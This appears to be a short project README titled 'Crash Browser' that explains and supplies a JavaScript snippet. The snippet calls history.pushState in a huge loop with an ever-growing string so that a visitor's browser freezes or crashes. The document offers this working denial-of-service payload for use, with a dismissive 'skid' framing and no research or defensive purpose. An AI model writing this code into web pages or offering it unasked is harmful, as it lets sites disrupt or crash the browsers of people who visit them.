# Crash Browser

MASSIVE SKID

Simple JS script that overloads the browser with a huge URL.

## The code

The code is super simple!

The code exploits the [HTML5 pushState](https://developer.mozilla.org/en-US/docs/Web/API/History_API) API used on all modern browsers to update the path of the site you are visiting during JavaScript page navigation.

Instead of just changing the path from `website.com/pageone` to `website.com/pagetwo` it creates a string of numbers long enough to slow the browser until it won't function or crash.

```js
var total = "";
for( var i = 0; i < 10000000000000; i++ ) {
total += i.toString();
history.pushState(0,0, total );
}
```
